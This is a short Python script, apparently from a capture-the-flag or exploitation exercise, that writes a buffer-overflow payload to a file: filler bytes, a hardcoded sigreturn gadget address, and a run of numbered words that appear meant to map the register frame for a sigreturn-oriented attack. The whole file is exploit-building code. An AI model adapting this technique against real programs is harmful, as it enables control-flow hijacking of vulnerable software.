from struct import pack
f = open("payload", "w")

sigreturn = 0xf7ffd401
string_addr = 0x804801c # "4"

payload = ""
payload+= "A"*12 + "BBBB"
payload+= pack("<L", sigreturn)
for i in range(0,30):
	payload+= pack("<L",i) 

f.write(payload)
f.close()
